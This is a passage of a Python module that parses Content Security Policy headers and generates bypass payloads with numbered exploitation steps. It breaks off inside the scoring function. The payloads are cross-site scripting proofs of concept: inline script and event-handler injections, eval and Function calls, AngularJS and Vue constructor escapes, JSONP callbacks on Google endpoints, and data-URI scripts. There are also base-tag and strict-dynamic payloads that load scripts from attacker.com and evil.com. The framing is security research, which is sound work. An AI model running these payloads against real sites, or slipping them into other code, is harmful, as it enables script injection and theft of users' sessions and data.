"""
Module 5: Content Security Policy (CSP) Bypass Analyzer and Generator

This module provides comprehensive tools for analyzing and bypassing Content Security Policy:
- CSP header parsing and policy analysis
- Bypass technique identification and generation
- Safe evaluation of CSP effectiveness
- Advanced payload generation for specific CSP configurations
- CSP weakness reporting and remediation suggestions

The analyzer helps security researchers understand CSP implementations and 
discover practical bypass techniques while maintaining ethical boundaries.
"""

import re
import json
import base64
import urllib.parse
from typing import List, Dict, Set, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import logging

logger = logging.getLogger(__name__)


class CSPDirective(Enum):
    """CSP directive types"""
    # Core directives that control script execution
    SCRIPT_SRC = "script-src"              # Controls script execution sources
    OBJECT_SRC = "object-src"              # Controls object/embed/applet sources
    STYLE_SRC = "style-src"                # Controls stylesheet sources
    IMG_SRC = "img-src"                    # Controls image sources
    MEDIA_SRC = "media-src"                # Controls audio/video sources
    FONT_SRC = "font-src"                  # Controls font sources
    CONNECT_SRC = "connect-src"            # Controls fetch/XHR/WebSocket connections
    CHILD_SRC = "child-src"                # Controls nested browsing contexts
    FRAME_SRC = "frame-src"                # Controls frame sources
    WORKER_SRC = "worker-src"              # Controls worker sources
    MANIFEST_SRC = "manifest-src"          # Controls manifest sources
    PREFETCH_SRC = "prefetch-src"          # Controls prefetch sources
    
    # Navigation directives
    NAVIGATE_TO = "navigate-to"            # Controls navigation destinations
    FORM_ACTION = "form-action"            # Controls form submission URLs
    FRAME_ANCESTORS = "frame-ancestors"    # Controls embedding in frames
    
    # Document directives
    BASE_URI = "base-uri"                  # Controls base element URLs
    PLUGIN_TYPES = "plugin-types"          # Controls plugin MIME types
    SANDBOX = "sandbox"                    # Applies sandbox restrictions
    
    # Reporting directives
    REPORT_URI = "report-uri"              # Sets violation reporting URL
    REPORT_TO = "report-to"                # Sets reporting endpoint group
    
    # Special directives
    DEFAULT_SRC = "default-src"            # Fallback for other directives
    UPGRADE_INSECURE_REQUESTS = "upgrade-insecure-requests"  # Forces HTTPS
    BLOCK_ALL_MIXED_CONTENT = "block-all-mixed-content"     # Blocks mixed content
    REQUIRE_SRI_FOR = "require-sri-for"    # Requires subresource integrity


class CSPKeyword(Enum):
    """CSP keyword values"""
    SELF = "'self'"                        # Same origin as document
    UNSAFE_INLINE = "'unsafe-inline'"      # Allows inline scripts/styles
    UNSAFE_EVAL = "'unsafe-eval'"          # Allows eval() and similar
    UNSAFE_HASHES = "'unsafe-hashes'"      # Allows event handler attributes
    STRICT_DYNAMIC = "'strict-dynamic'"    # Trusts scripts created by trusted scripts
    NONE = "'none'"                        # Blocks all sources
    REPORT_SAMPLE = "'report-sample'"      # Includes sample in violation reports


class BypassTechnique(Enum):
    """Types of CSP bypass techniques"""
    UNSAFE_INLINE = "unsafe_inline"                    # Exploit 'unsafe-inline'
    UNSAFE_EVAL = "unsafe_eval"                       # Exploit 'unsafe-eval'
    JSONP_CALLBACK = "jsonp_callback"                 # JSONP callback injection
    ANGULAR_INJECTION = "angular_injection"           # AngularJS template injection
    VUE_INJECTION = "vue_injection"                   # Vue.js template injection
    REACT_INJECTION = "react_injection"               # React DOM injection
    SCRIPT_GADGET = "script_gadget"                   # DOM-based script gadgets
    BASE_URI_INJECTION = "base_uri_injection"         # Base URI manipulation
    LOCATION_HASH = "location_hash"                   # Fragment-based injection
    IFRAME_SRCDOC = "iframe_srcdoc"                   # Iframe srcdoc bypass
    DATA_URI = "data_uri"                             # Data URI scheme
    BLOB_URI = "blob_uri"                             # Blob URI scheme
    JAVASCRIPT_URI = "javascript_uri"                 # JavaScript protocol
    WHITELISTED_DOMAIN = "whitelisted_domain"         # Trusted domain exploitation
    STRICT_DYNAMIC_ABUSE = "strict_dynamic_abuse"     # 'strict-dynamic' exploitation
    NONCE_PREDICTION = "nonce_prediction"             # Predictable nonce values
    HASH_COLLISION = "hash_collision"                 # Hash collision attacks
    MIXED_CONTENT = "mixed_content"                   # Mixed content injection
    FORM_ACTION_BYPASS = "form_action_bypass"         # Form action manipulation
    META_REFRESH = "meta_refresh"                     # Meta refresh redirection


@dataclass
class CSPDirectiveConfig:
    """Configuration for a CSP directive"""
    directive: CSPDirective                           # The directive type
    sources: Set[str]                                # Allowed source expressions
    keywords: Set[CSPKeyword]                        # CSP keyword values used
    nonces: Set[str] = field(default_factory=set)   # Nonce values found
    hashes: Set[str] = field(default_factory=set)   # Hash values found
    is_restrictive: bool = True                      # Whether directive is restrictive
    bypass_risk: str = "low"                         # Risk level: low/medium/high/critical


@dataclass
class CSPBypassPayload:
    """A payload designed to bypass specific CSP configurations"""
    technique: BypassTechnique                       # Bypass technique used
    payload: str                                     # The actual payload
    description: str                                 # Human-readable description
    requirements: List[str]                          # Prerequisites for success
    confidence: float                                # Success probability (0.0-1.0)
    affected_directives: List[CSPDirective]          # Directives this bypasses
    payload_category: str                            # Type of payload (script/style/etc)
    exploitation_steps: List[str]                    # Step-by-step instructions


@dataclass
class CSPAnalysisResult:
    """Results of CSP policy analysis"""
    policy_header: str                               # Original CSP header
    directives: Dict[CSPDirective, CSPDirectiveConfig]  # Parsed directives
    bypass_opportunities: List[CSPBypassPayload]     # Found bypass techniques
    security_score: float                           # Overall security score (0.0-10.0)
    critical_issues: List[str]                      # Critical security problems
    recommendations: List[str]                      # Security improvements
    is_bypassable: bool                             # Whether CSP can be bypassed
    bypass_summary: str                             # Summary of bypass possibilities


class CSPBypassAnalyzer:
    """
    Advanced Content Security Policy bypass analyzer.
    
    This analyzer examines CSP policies to identify bypass opportunities
    and generates practical exploit payloads for security testing.
    
    Features:
    - Comprehensive CSP directive parsing and analysis
    - Advanced bypass technique identification
    - Context-aware payload generation
    - Security scoring and recommendations
    - Practical exploitation guidance
    
    Example:
        analyzer = CSPBypassAnalyzer()
        result = analyzer.analyze_csp("script-src 'self' 'unsafe-inline'")
        for bypass in result.bypass_opportunities:
            print(f"Bypass: {bypass.technique} - {bypass.payload}")
    """
    
    def __init__(self):
        # Initialize bypass technique patterns and generators
        self.bypass_generators = {
            BypassTechnique.UNSAFE_INLINE: self._generate_unsafe_inline_bypass,
            BypassTechnique.UNSAFE_EVAL: self._generate_unsafe_eval_bypass,
            BypassTechnique.JSONP_CALLBACK: self._generate_jsonp_bypass,
            BypassTechnique.ANGULAR_INJECTION: self._generate_angular_bypass,
            BypassTechnique.VUE_INJECTION: self._generate_vue_bypass,
            BypassTechnique.SCRIPT_GADGET: self._generate_script_gadget_bypass,
            BypassTechnique.BASE_URI_INJECTION: self._generate_base_uri_bypass,
            BypassTechnique.LOCATION_HASH: self._generate_location_hash_bypass,
            BypassTechnique.IFRAME_SRCDOC: self._generate_iframe_srcdoc_bypass,
            BypassTechnique.DATA_URI: self._generate_data_uri_bypass,
            BypassTechnique.WHITELISTED_DOMAIN: self._generate_whitelisted_domain_bypass,
            BypassTechnique.STRICT_DYNAMIC_ABUSE: self._generate_strict_dynamic_bypass,
            BypassTechnique.META_REFRESH: self._generate_meta_refresh_bypass,
        }
        
        # Common whitelisted domains that might allow bypass
        self.common_whitelist_domains = {
            'googleapis.com',      # Google APIs (often includes JSONP endpoints)
            'google.com',         # Google services
            'gstatic.com',        # Google static content
            'ajax.googleapis.com', # jQuery CDN
            'cdnjs.cloudflare.com', # CDNJS
            'code.jquery.com',    # jQuery CDN
            'maxcdn.bootstrapcdn.com', # Bootstrap CDN
            'unpkg.com',          # Universal package manager
            'cdn.jsdelivr.net',   # JSDelivr CDN
            'raw.githubusercontent.com', # GitHub raw content
            'github.io',          # GitHub Pages
            'netlify.app',        # Netlify hosting
            'herokuapp.com',      # Heroku hosting
            'firebaseapp.com',    # Firebase hosting
        }
        
        # Framework-specific bypass patterns
        self.framework_patterns = {
            'angular': [
                '{{constructor.constructor("alert(1)")()}}',    # AngularJS sandbox escape
                '{{$new.constructor("alert(1)")()}}',           # AngularJS constructor access
                '{{[].constructor.constructor("alert(1)")()}}', # Array constructor escape
            ],
            'vue': [
                '{{constructor.constructor("alert(1)")()}}',    # Vue.js constructor access
                '{{$root.constructor.constructor("alert(1)")()}}', # Root constructor access
            ],
            'react': [
                'dangerouslySetInnerHTML={{__html: "<script>alert(1)</script>"}}', # React DOM injection
            ]
        }
        
        # CSP directive relationships and fallbacks
        self.directive_fallbacks = {
            CSPDirective.SCRIPT_SRC: CSPDirective.DEFAULT_SRC,
            CSPDirective.STYLE_SRC: CSPDirective.DEFAULT_SRC,
            CSPDirective.IMG_SRC: CSPDirective.DEFAULT_SRC,
            CSPDirective.OBJECT_SRC: CSPDirective.DEFAULT_SRC,
            CSPDirective.MEDIA_SRC: CSPDirective.DEFAULT_SRC,
            CSPDirective.FONT_SRC: CSPDirective.DEFAULT_SRC,
            CSPDirective.CONNECT_SRC: CSPDirective.DEFAULT_SRC,
            CSPDirective.CHILD_SRC: CSPDirective.DEFAULT_SRC,
            CSPDirective.WORKER_SRC: CSPDirective.DEFAULT_SRC,
        }
        
        # Security scoring weights
        self.security_weights = {
            'unsafe_inline': -3.0,      # Major security reduction
            'unsafe_eval': -2.5,        # Significant security reduction
            'wildcard': -2.0,           # Wildcard sources
            'data_uri': -1.5,           # Data URI allowed
            'http_sources': -1.0,       # HTTP sources in HTTPS context
            'missing_directives': -0.5, # Important directives missing
            'restrictive_policy': +2.0,  # Good restrictive policies
        }
    
    def analyze_csp(self, csp_header: str) -> CSPAnalysisResult:
        """
        Analyze a CSP header for bypass opportunities and security weaknesses.
        
        Args:
            csp_header: The Content-Security-Policy header value
            
        Returns:
            CSPAnalysisResult containing analysis and bypass opportunities
        """
        logger.info("Starting CSP analysis")
        
        # Parse the CSP header into directive configurations
        directives = self._parse_csp_header(csp_header)
        
        # Identify bypass opportunities for each technique
        bypass_opportunities = []
        for technique in BypassTechnique:
            bypasses = self._analyze_bypass_technique(technique, directives)
            bypass_opportunities.extend(bypasses)
        
        # Calculate overall security score
        security_score = self._calculate_security_score(directives, bypass_opportunities)
        
        # Identify critical security issues
        critical_issues = self._identify_critical_issues(directives)
        
        # Generate security recommendations
        recommendations = self._generate_recommendations(directives, bypass_opportunities)
        
        # Determine if CSP is bypassable
        is_bypassable = len([b for b in bypass_opportunities if b.confidence > 0.7]) > 0
        
        # Create bypass summary
        bypass_summary = self._create_bypass_summary(bypass_opportunities)
        
        result = CSPAnalysisResult(
            policy_header=csp_header,
            directives=directives,
            bypass_opportunities=bypass_opportunities,
            security_score=security_score,
            critical_issues=critical_issues,
            recommendations=recommendations,
            is_bypassable=is_bypassable,
            bypass_summary=bypass_summary
        )
        
        logger.info(f"CSP analysis complete. Found {len(bypass_opportunities)} bypass opportunities")
        return result
    
    def _parse_csp_header(self, csp_header: str) -> Dict[CSPDirective, CSPDirectiveConfig]:
        """Parse CSP header into structured directive configurations"""
        directives = {}
        
        # Split CSP header by semicolons to get individual directives
        directive_strings = [d.strip() for d in csp_header.split(';') if d.strip()]
        
        for directive_string in directive_strings:
            # Split directive into name and sources
            parts = directive_string.split()
            if not parts:
                continue
                
            directive_name = parts[0].lower()
            source_list = parts[1:] if len(parts) > 1 else []
            
            # Find matching CSP directive enum
            matching_directive = None
            for directive_enum in CSPDirective:
                if directive_enum.value == directive_name:
                    matching_directive = directive_enum
                    break
            
            if not matching_directive:
                continue  # Skip unknown directives
            
            # Parse sources and extract keywords, nonces, hashes
            sources = set()
            keywords = set()
            nonces = set()
            hashes = set()
            
            for source in source_list:
                # Check for CSP keywords (enclosed in quotes)
                if source.startswith("'") and source.endswith("'"):
                    # Check if it's a standard keyword
                    for keyword in CSPKeyword:
                        if keyword.value == source:
                            keywords.add(keyword)
                            break
                    else:
                        # Check for nonce or hash
                        if source.startswith("'nonce-"):
                            nonce_value = source[7:-1]  # Remove 'nonce-' and closing quote
                            nonces.add(nonce_value)
                        elif source.startswith("'sha"):
                            hash_value = source[1:-1]  # Remove quotes
                            hashes.add(hash_value)
                else:
                    # Regular source (domain, scheme, etc.)
                    sources.add(source)
            
            # Determine if directive is restrictive
            is_restrictive = self._is_directive_restrictive(keywords, sources)
            
            # Calculate bypass risk
            bypass_risk = self._calculate_directive_risk(keywords, sources)
            
            directives[matching_directive] = CSPDirectiveConfig(
                directive=matching_directive,
                sources=sources,
                keywords=keywords,
                nonces=nonces,
                hashes=hashes,
                is_restrictive=is_restrictive,
                bypass_risk=bypass_risk
            )
        
        return directives
    
    def _is_directive_restrictive(self, keywords: Set[CSPKeyword], sources: Set[str]) -> bool:
        """Determine if a directive configuration is restrictive"""
        # Unsafe keywords make directives non-restrictive
        unsafe_keywords = {CSPKeyword.UNSAFE_INLINE, CSPKeyword.UNSAFE_EVAL, CSPKeyword.UNSAFE_HASHES}
        if any(keyword in keywords for keyword in unsafe_keywords):
            return False
        
        # Wildcard sources are not restrictive
        if '*' in sources:
            return False
        
        # Data URLs are less restrictive
        if any(source.startswith('data:') for source in sources):
            return False
        
        # Only 'none' or specific whitelisted sources are restrictive
        if CSPKeyword.NONE in keywords:
            return True
        
        if CSPKeyword.SELF in keywords and len(sources) <= 2:  # 'self' + maybe one more
            return True
        
        return len(sources) <= 3  # Few specific sources
    
    def _calculate_directive_risk(self, keywords: Set[CSPKeyword], sources: Set[str]) -> str:
        """Calculate the bypass risk level for a directive"""
        # Critical risk: unsafe-inline or unsafe-eval
        if CSPKeyword.UNSAFE_INLINE in keywords or CSPKeyword.UNSAFE_EVAL in keywords:
            return "critical"
        
        # High risk: wildcard or many domains
        if '*' in sources or len(sources) > 5:
            return "high"
        
        # Medium risk: data URIs or common CDNs
        if any(source.startswith('data:') for source in sources):
            return "medium"
        
        if any(domain in source for source in sources for domain in self.common_whitelist_domains):
            return "medium"
        
        # Low risk: restrictive configuration
        return "low"
    
    def _analyze_bypass_technique(self, technique: BypassTechnique, 
                                directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Analyze if a specific bypass technique is possible"""
        if technique in self.bypass_generators:
            return self.bypass_generators[technique](directives)
        else:
            return []
    
    def _generate_unsafe_inline_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate bypasses for unsafe-inline configurations"""
        bypasses = []
        
        # Check script-src for unsafe-inline
        script_directive = directives.get(CSPDirective.SCRIPT_SRC) or directives.get(CSPDirective.DEFAULT_SRC)
        if script_directive and CSPKeyword.UNSAFE_INLINE in script_directive.keywords:
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.UNSAFE_INLINE,
                payload='<script>alert("CSP Bypass - Unsafe Inline")</script>',
                description="Direct inline script execution via 'unsafe-inline'",
                requirements=["'unsafe-inline' in script-src or default-src"],
                confidence=0.95,
                affected_directives=[CSPDirective.SCRIPT_SRC],
                payload_category="script",
                exploitation_steps=[
                    "1. Inject the payload into any HTML context",
                    "2. The inline script will execute immediately",
                    "3. No additional setup required due to 'unsafe-inline'"
                ]
            ))
            
            # Additional inline event handler bypass
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.UNSAFE_INLINE,
                payload='<img src=x onerror="alert(\'CSP Bypass - Event Handler\')">',
                description="Inline event handler execution via 'unsafe-inline'",
                requirements=["'unsafe-inline' in script-src or default-src"],
                confidence=0.9,
                affected_directives=[CSPDirective.SCRIPT_SRC],
                payload_category="event_handler",
                exploitation_steps=[
                    "1. Inject payload in HTML content area",
                    "2. Image load failure triggers onerror handler",
                    "3. Inline JavaScript executes due to 'unsafe-inline'"
                ]
            ))
        
        return bypasses
    
    def _generate_unsafe_eval_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate bypasses for unsafe-eval configurations"""
        bypasses = []
        
        script_directive = directives.get(CSPDirective.SCRIPT_SRC) or directives.get(CSPDirective.DEFAULT_SRC)
        if script_directive and CSPKeyword.UNSAFE_EVAL in script_directive.keywords:
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.UNSAFE_EVAL,
                payload='<script>eval("alert(\\"CSP Bypass - Eval\\")")</script>',
                description="Code execution via eval() function with 'unsafe-eval'",
                requirements=["'unsafe-eval' in script-src", "Ability to inject script content"],
                confidence=0.9,
                affected_directives=[CSPDirective.SCRIPT_SRC],
                payload_category="script",
                exploitation_steps=[
                    "1. Inject script tag with eval() call",
                    "2. eval() executes due to 'unsafe-eval' permission",
                    "3. String-based code execution achieved"
                ]
            ))
            
            # Function constructor bypass
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.UNSAFE_EVAL,
                payload='<script>Function("alert(\\"CSP Bypass - Function Constructor\\")")()</script>',
                description="Code execution via Function constructor with 'unsafe-eval'",
                requirements=["'unsafe-eval' in script-src"],
                confidence=0.85,
                affected_directives=[CSPDirective.SCRIPT_SRC],
                payload_category="script",
                exploitation_steps=[
                    "1. Use Function constructor to create executable code",
                    "2. Function constructor allowed by 'unsafe-eval'",
                    "3. Immediately invoke the created function"
                ]
            ))
        
        return bypasses
    
    def _generate_jsonp_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate JSONP callback bypasses for whitelisted domains"""
        bypasses = []
        
        script_directive = directives.get(CSPDirective.SCRIPT_SRC) or directives.get(CSPDirective.DEFAULT_SRC)
        if not script_directive:
            return bypasses
        
        # Check for common JSONP-enabled domains in whitelist
        jsonp_domains = {
            'googleapis.com': 'https://accounts.google.com/o/oauth2/revoke?callback=alert',
            'google.com': 'https://www.google.com/complete/search?client=chrome&jsonp=alert',
            'gstatic.com': 'https://cse.google.com/api/cx/016652522511468994752:1y-bg_ij9_a/cse/suggest?callback=alert',
        }
        
        for domain, jsonp_url in jsonp_domains.items():
            # Check if domain is whitelisted
            if any(domain in source or source == domain for source in script_directive.sources):
                bypasses.append(CSPBypassPayload(
                    technique=BypassTechnique.JSONP_CALLBACK,
                    payload=f'<script src="{jsonp_url}"></script>',
                    description=f"JSONP callback execution via whitelisted {domain}",
                    requirements=[f"{domain} whitelisted in script-src", "Network access to domain"],
                    confidence=0.8,
                    affected_directives=[CSPDirective.SCRIPT_SRC],
                    payload_category="jsonp",
                    exploitation_steps=[
                        f"1. Inject script tag pointing to JSONP endpoint on {domain}",
                        "2. JSONP endpoint calls specified callback function",
                        "3. Callback parameter contains malicious JavaScript",
                        "4. Code executes in page context"
                    ]
                ))
        
        return bypasses
    
    def _generate_angular_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate AngularJS template injection bypasses"""
        bypasses = []
        
        # AngularJS bypasses work when unsafe-eval is present or when using older versions
        script_directive = directives.get(CSPDirective.SCRIPT_SRC) or directives.get(CSPDirective.DEFAULT_SRC)
        
        if script_directive and CSPKeyword.UNSAFE_EVAL in script_directive.keywords:
            for pattern in self.framework_patterns['angular']:
                bypasses.append(CSPBypassPayload(
                    technique=BypassTechnique.ANGULAR_INJECTION,
                    payload=pattern,
                    description="AngularJS template injection with constructor escape",
                    requirements=["AngularJS framework loaded", "'unsafe-eval' in CSP", "Template injection point"],
                    confidence=0.7,
                    affected_directives=[CSPDirective.SCRIPT_SRC],
                    payload_category="template_injection",
                    exploitation_steps=[
                        "1. Identify AngularJS template injection point",
                        "2. Inject constructor-based payload",
                        "3. AngularJS evaluates expression due to 'unsafe-eval'",
                        "4. Constructor escape leads to code execution"
                    ]
                ))
        
        return bypasses
    
    def _generate_vue_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate Vue.js template injection bypasses"""
        bypasses = []
        
        script_directive = directives.get(CSPDirective.SCRIPT_SRC) or directives.get(CSPDirective.DEFAULT_SRC)
        
        if script_directive and CSPKeyword.UNSAFE_EVAL in script_directive.keywords:
            for pattern in self.framework_patterns['vue']:
                bypasses.append(CSPBypassPayload(
                    technique=BypassTechnique.VUE_INJECTION,
                    payload=pattern,
                    description="Vue.js template injection with constructor access",
                    requirements=["Vue.js framework loaded", "'unsafe-eval' in CSP", "Template injection point"],
                    confidence=0.65,
                    affected_directives=[CSPDirective.SCRIPT_SRC],
                    payload_category="template_injection",
                    exploitation_steps=[
                        "1. Find Vue.js template expression injection point",
                        "2. Use constructor access to escape sandbox",
                        "3. Vue.js evaluates expression with 'unsafe-eval'",
                        "4. Achieve arbitrary code execution"
                    ]
                ))
        
        return bypasses
    
    def _generate_script_gadget_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate script gadget bypasses using DOM manipulation"""
        bypasses = []
        
        # Script gadgets work when there are whitelisted domains with vulnerable scripts
        script_directive = directives.get(CSPDirective.SCRIPT_SRC) or directives.get(CSPDirective.DEFAULT_SRC)
        
        if script_directive and script_directive.sources:
            # Common script gadget patterns
            gadgets = [
                {
                    'payload': '<div id="1" data-url="javascript:alert(\'Script Gadget\')"></div>',
                    'description': 'DOM-based script gadget via data attributes',
                    'requirements': ['Vulnerable JavaScript framework', 'DOM manipulation capability'],
                },
                {
                    'payload': '<input id="gadget" value="alert(\'Script Gadget\')" onfocus="eval(this.value)">',
                    'description': 'Form input script gadget with focus trigger',
                    'requirements': ['Form input manipulation', 'Focus event capability'],
                }
            ]
            
            for gadget in gadgets:
                bypasses.append(CSPBypassPayload(
                    technique=BypassTechnique.SCRIPT_GADGET,
                    payload=gadget['payload'],
                    description=gadget['description'],
                    requirements=gadget['requirements'],
                    confidence=0.4,  # Lower confidence as it requires specific conditions
                    affected_directives=[CSPDirective.SCRIPT_SRC],
                    payload_category="dom_manipulation",
                    exploitation_steps=[
                        "1. Inject DOM elements with script gadget patterns",
                        "2. Trigger DOM events or framework processing",
                        "3. Vulnerable framework processes injected content",
                        "4. Script execution occurs via DOM manipulation"
                    ]
                ))
        
        return bypasses
    
    def _generate_base_uri_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate base URI manipulation bypasses"""
        bypasses = []
        
        # Check if base-uri is not restricted
        base_uri_directive = directives.get(CSPDirective.BASE_URI)
        
        if not base_uri_directive or CSPKeyword.UNSAFE_INLINE in base_uri_directive.keywords:
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.BASE_URI_INJECTION,
                payload='<base href="//attacker.com/"><script src="malicious.js"></script>',
                description="Base URI manipulation to load scripts from attacker domain",
                requirements=["base-uri not restricted", "Ability to inject base tag"],
                confidence=0.6,
                affected_directives=[CSPDirective.BASE_URI, CSPDirective.SCRIPT_SRC],
                payload_category="base_manipulation",
                exploitation_steps=[
                    "1. Inject base tag pointing to attacker-controlled domain",
                    "2. Inject relative script tag after base tag",
                    "3. Browser resolves script src relative to malicious base",
                    "4. Script loads from attacker domain bypassing CSP"
                ]
            ))
        
        return bypasses
    
    def _generate_location_hash_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate location.hash-based bypasses"""
        bypasses = []
        
        # Hash-based bypasses work with certain CSP configurations
        bypasses.append(CSPBypassPayload(
            technique=BypassTechnique.LOCATION_HASH,
            payload='<script>eval(location.hash.slice(1))</script>#alert("Hash Bypass")',
            description="Location.hash evaluation for CSP bypass",
            requirements=["'unsafe-eval' in script-src", "Control over URL fragment"],
            confidence=0.5,
            affected_directives=[CSPDirective.SCRIPT_SRC],
            payload_category="hash_injection",
            exploitation_steps=[
                "1. Inject script that evaluates location.hash",
                "2. Craft URL with malicious payload in fragment",
                "3. Script extracts and evaluates hash content",
                "4. Code execution via eval() with fragment data"
            ]
        ))
        
        return bypasses
    
    def _generate_iframe_srcdoc_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate iframe srcdoc bypasses"""
        bypasses = []
        
        # Check if child-src or frame-src allows data URIs
        frame_directive = (directives.get(CSPDirective.FRAME_SRC) or 
                          directives.get(CSPDirective.CHILD_SRC) or 
                          directives.get(CSPDirective.DEFAULT_SRC))
        
        if frame_directive and any('data:' in source for source in frame_directive.sources):
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.IFRAME_SRCDOC,
                payload='<iframe srcdoc="<script>parent.alert(\'Iframe Srcdoc Bypass\')</script>"></iframe>',
                description="Iframe srcdoc attribute bypass for script execution",
                requirements=["iframe injection capability", "data: URI allowed in frame sources"],
                confidence=0.7,
                affected_directives=[CSPDirective.FRAME_SRC, CSPDirective.CHILD_SRC],
                payload_category="iframe_injection",
                exploitation_steps=[
                    "1. Inject iframe with srcdoc attribute",
                    "2. Include malicious script in srcdoc content",
                    "3. Iframe content executes in separate context",
                    "4. Script can access parent window if same-origin"
                ]
            ))
        
        return bypasses
    
    def _generate_data_uri_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate data URI bypasses"""
        bypasses = []
        
        script_directive = directives.get(CSPDirective.SCRIPT_SRC) or directives.get(CSPDirective.DEFAULT_SRC)
        
        if script_directive and any('data:' in source for source in script_directive.sources):
            # Base64 encoded JavaScript
            js_payload = "alert('Data URI Bypass')"
            encoded_payload = base64.b64encode(js_payload.encode()).decode()
            
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.DATA_URI,
                payload=f'<script src="data:text/javascript;base64,{encoded_payload}"></script>',
                description="Data URI scheme bypass with base64 encoded JavaScript",
                requirements=["data: URI allowed in script-src", "Base64 encoding support"],
                confidence=0.85,
                affected_directives=[CSPDirective.SCRIPT_SRC],
                payload_category="data_uri",
                exploitation_steps=[
                    "1. Encode malicious JavaScript as base64",
                    "2. Create data URI with JavaScript MIME type",
                    "3. Inject script tag with data URI src",
                    "4. Browser executes decoded JavaScript"
                ]
            ))
        
        return bypasses
    
    def _generate_whitelisted_domain_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate bypasses using whitelisted domains"""
        bypasses = []
        
        script_directive = directives.get(CSPDirective.SCRIPT_SRC) or directives.get(CSPDirective.DEFAULT_SRC)
        
        if script_directive:
            # Check for common vulnerable whitelisted domains
            vulnerable_domains = {
                'github.io': 'https://username.github.io/repo/xss.js',
                'herokuapp.com': 'https://evil-app.herokuapp.com/xss.js',
                'netlify.app': 'https://evil-site.netlify.app/xss.js',
                'raw.githubusercontent.com': 'https://raw.githubusercontent.com/user/repo/master/xss.js',
            }
            
            for domain, example_url in vulnerable_domains.items():
                if any(domain in source or source.endswith(domain) for source in script_directive.sources):
                    bypasses.append(CSPBypassPayload(
                        technique=BypassTechnique.WHITELISTED_DOMAIN,
                        payload=f'<script src="{example_url}"></script>',
                        description=f"Whitelisted domain abuse via {domain}",
                        requirements=[f"Control over content on {domain}", f"{domain} whitelisted in CSP"],
                        confidence=0.6,
                        affected_directives=[CSPDirective.SCRIPT_SRC],
                        payload_category="domain_abuse",
                        exploitation_steps=[
                            f"1. Upload malicious JavaScript to {domain}",
                            "2. Inject script tag pointing to malicious resource",
                            f"3. Browser loads script from trusted {domain}",
                            "4. Malicious code executes with full privileges"
                        ]
                    ))
        
        return bypasses
    
    def _generate_strict_dynamic_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate strict-dynamic bypasses"""
        bypasses = []
        
        script_directive = directives.get(CSPDirective.SCRIPT_SRC) or directives.get(CSPDirective.DEFAULT_SRC)
        
        if script_directive and CSPKeyword.STRICT_DYNAMIC in script_directive.keywords:
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.STRICT_DYNAMIC_ABUSE,
                payload='<script nonce="TRUSTED_NONCE">document.createElement("script").src="//evil.com/xss.js"</script>',
                description="'strict-dynamic' abuse via trusted script creating untrusted script",
                requirements=["'strict-dynamic' in CSP", "Valid nonce or hash", "Script creation capability"],
                confidence=0.5,
                affected_directives=[CSPDirective.SCRIPT_SRC],
                payload_category="strict_dynamic",
                exploitation_steps=[
                    "1. Inject trusted script with valid nonce/hash",
                    "2. Use trusted script to create new script element",
                    "3. Set malicious src on dynamically created script",
                    "4. 'strict-dynamic' allows execution of created script"
                ]
            ))
        
        return bypasses
    
    def _generate_meta_refresh_bypass(self, directives: Dict[CSPDirective, CSPDirectiveConfig]) -> List[CSPBypassPayload]:
        """Generate meta refresh bypasses"""
        bypasses = []
        
        # Meta refresh bypasses work when navigate-to is not restricted
        navigate_directive = directives.get(CSPDirective.NAVIGATE_TO)
        
        if not navigate_directive:  # navigate-to not set
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.META_REFRESH,
                payload='<meta http-equiv="refresh" content="0;url=javascript:alert(\'Meta Refresh Bypass\')">',
                description="Meta refresh redirection to javascript: URI",
                requirements=["Meta tag injection capability", "navigate-to directive not set"],
                confidence=0.3,  # Lower confidence due to browser restrictions
                affected_directives=[CSPDirective.NAVIGATE_TO],
                payload_category="navigation",
                exploitation_steps=[
                    "1. Inject meta refresh tag with javascript: URI",
                    "2. Browser attempts to navigate to javascript: URL",
                    "3. JavaScript protocol execution may occur",
                    "4. Success depends on browser and CSP implementation"
                ]
            ))
        
        return bypasses
    
    def _calculate_security_score(self, directives: Dict[CSPDirective, CSPDirectiveConfig], 
                                bypasses: List[CSPBypassPayload]) -> float:
        """Calculate overall security score (0.0-10.0)"""
        score = 5.0  # Start with neutral score
        
        # Penalty for dangerous keywords
        for directive in directives.values():
            if CSPKeyword.UNSAFE_INLINE in directive.keywords:
                score += self.security_weights['unsafe_inline']
            if CSPKeyword.UNSAFE_EVAL in directive.keywords:
                score += self.security_weights['unsafe_eval']
            
            # Penalty for wildcards
            if '*' in directive.sources:
                score += self.security_weights['wildcard']
            
            # Penalty for data URIs
            if any('data:' in source for source in directive.sources):
                score += self.security_weights['data_uri']
        
        # Penalty based on high-confidence bypasses
        high_confidence_bypasses = [b for b in bypasses if b.confidence > 0.7]
